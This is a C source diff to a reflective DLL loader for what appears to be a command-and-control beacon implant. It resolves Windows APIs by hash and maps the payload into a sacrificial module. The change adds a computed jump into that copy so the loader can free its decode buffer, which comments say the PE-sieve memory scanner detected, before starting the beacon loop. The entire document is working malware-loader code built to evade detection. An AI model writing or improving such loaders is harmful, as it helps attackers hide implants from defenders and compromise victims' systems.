@@ -119,6 +119,7 @@ typedef struct {
 #define BW_H_EXITTHREAD    0x60E0CEEFUL
 #define BW_H_FLUSHICACHE   0x53120980UL
 #define BW_H_GETCURPROC    0x7B8F17E6UL
+#define BW_H_VIRTUALFREE   0x030633ACUL
 
 typedef HMODULE (WINAPI *BW_LOADLIBA)(LPCSTR);
 typedef FARPROC (WINAPI *BW_GETPROC)(HMODULE, LPCSTR);
@@ -129,7 +130,9 @@ typedef BOOL    (WINAPI *BW_FREELIB)(HMODULE);
 typedef VOID    (WINAPI *BW_EXITTHR)(DWORD);
 typedef BOOL    (WINAPI *BW_FLUSH)(HANDLE, LPCVOID, SIZE_T);
 typedef HANDLE  (WINAPI *BW_GETCUR)(void);
+typedef BOOL    (WINAPI *BW_VFREE)(LPVOID, SIZE_T, DWORD);
 typedef BOOL    (WINAPI *BW_DLLMAIN)(void *, DWORD, void *);
+typedef void    (*BW_CONT)(BW_VFREE, void *, BW_DLLMAIN, void *, void *, BW_EXITTHR);
 
 static __forceinline void * bw_zero(void * dst, SIZE_T n) {
     __stosb((unsigned char *)dst, 0, n);
@@ -297,6 +300,10 @@ static __forceinline int bw_fill_iat(unsigned char * image, BW_LOADLIBA pLoadLib
  * emit if the helpers actually inline). */
 #pragma code_seg(".text$aaa")
 
+static void bw_after_hop(BW_VFREE pVF, void * free_base,
+                         BW_DLLMAIN dllmain, void * sc_base,
+                         void * lpParameter, BW_EXITTHR pET);
+
 __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
 {
     unsigned char * flat;
@@ -310,6 +317,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     BW_EXITTHR     pET;
     BW_FLUSH       pFlush;
     BW_GETCUR      pGetCur;
+    BW_VFREE       pVF;
     unsigned char * nth;
     IMG_OPT64 * opt;
     IMG_SECTION * sec;
@@ -369,6 +377,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     pET             = (BW_EXITTHR)   bw_find_export_hash((void *)kern, BW_H_EXITTHREAD);
     pFlush          = (BW_FLUSH)     bw_find_export_hash((void *)kern, BW_H_FLUSHICACHE);
     pGetCur         = (BW_GETCUR)    bw_find_export_hash((void *)kern, BW_H_GETCURPROC);
+    pVF             = (BW_VFREE)     bw_find_export_hash((void *)kern, BW_H_VIRTUALFREE);
     if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVP == NULL ||
         pVQ == NULL || pLLW == NULL)
         return 0;
@@ -524,13 +533,58 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
      * NULL and ntdll crashed on `cmp [rbx+10h], 0DDEEDDEEh` with rbx=0.
      * Official UDRL does PROCESS_ATTACH inside the loader and returns the
      * EP so the DOS stub can call reason 4; we do both here because our
-     * DllMain starts the beacon loop on reason 4 and must not return. */
+     * DllMain starts the beacon loop on reason 4 and is contracted not
+     * to return.
+     *
+     * Hop into the copy of this function that now lives in the sacrificial
+     * image BEFORE freeing the container's private decode buffer (the
+     * Implanted PE PE-sieve reported at 0xa0000) and before DllMain. */
     dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
-    dllmain((void *)sc_base, DLL_PROCESS_ATTACH, lpParameter);
-    dllmain((void *)sc_base, 4, lpParameter);
+    {
+        void * free_base = flat;
+        MEMORY_BASIC_INFORMATION mbi;
+        DWORD file_off = (DWORD)((unsigned char *)&bw_after_hop - flat);
+        DWORD hop_rva = 0;
+        QWORD hop;
+        if (pVQ && pVQ(flat, &mbi, sizeof(mbi)) && mbi.AllocationBase)
+            free_base = mbi.AllocationBase;
+        /* The container runs this loader from a FLAT FILE copy, so
+         * &bw_after_hop - flat is a file offset, not an RVA. The
+         * sacrificial image is laid out at natural RVAs, so convert. */
+        for (i = 0; i < nsec; i++) {
+            DWORD raw = sec[i].PointerToRawData;
+            DWORD rsz = sec[i].SizeOfRawData;
+            if (file_off >= raw && file_off < raw + rsz) {
+                hop_rva = sec[i].VirtualAddress + (file_off - raw);
+                break;
+            }
+        }
+        if (hop_rva == 0) {
+            if (pET) pET(0);
+            return 0;
+        }
+        hop = (QWORD)(DWORD_PTR)sc_base + hop_rva;
+        ((BW_CONT)hop)(pVF, free_base, dllmain, sc_base, lpParameter, pET);
+    }
     if (pET != NULL)
         pET(0);
     return (ULONG_PTR)(DWORD_PTR)sc_base;
+}
+
+/* Must sit AFTER ReflectiveLoader so the extracted section still starts
+ * at the export (the client's extractor takes byte 0 of the first
+ * executable section). Not inlined: the hop above is a computed
+ * address, not a call. */
+static void bw_after_hop(BW_VFREE pVF, void * free_base,
+                         BW_DLLMAIN dllmain, void * sc_base,
+                         void * lpParameter, BW_EXITTHR pET)
+{
+    if (pVF && free_base)
+        pVF(free_base, 0, MEM_RELEASE);
+    dllmain(sc_base, DLL_PROCESS_ATTACH, lpParameter);
+    dllmain(sc_base, 4, lpParameter);
+    if (pET != NULL)
+        pET(0);
 }
 
 #pragma code_seg()
